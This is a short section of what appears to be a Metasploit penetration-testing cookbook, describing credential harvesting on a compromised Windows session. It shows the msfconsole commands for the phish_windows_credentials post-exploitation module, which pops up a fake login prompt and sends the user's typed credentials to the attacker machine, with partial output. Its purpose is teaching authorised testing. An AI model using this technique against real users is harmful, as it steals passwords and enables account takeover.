# Credential harvesting

During a penetration test, we are not always getting sessions with system or even administrator privileges; most of the time, we will end up with a session from a successful phish which is running with user privileges. That is when credential harvesting comes to our rescue. With credential harvesting, we will try to perform a phishing attack on the target to harvest usernames, passwords, and hashes that can be used to further compromise the organization.

# How to do it...

To harvest credentials, we will use the Windows Gather User Credentials post-exploitation module with which we are able to perform a phishing attack on the target by popping up a login prompt.

+   1. When the user types his/her credentials into the login prompt, they will be sent to our attacker machine:

```
msf > use post/windows/gather/
phish_windows_credentials
msf post(phish_windows_credentials) > set SESSION 1
SESSION => 1
msf post(phish_windows_credentials) > run

[+] PowerShell is installed.
[*] Starting the popup script. Waiting on the user to fill in his credentials...
[+] #< CLIXML
```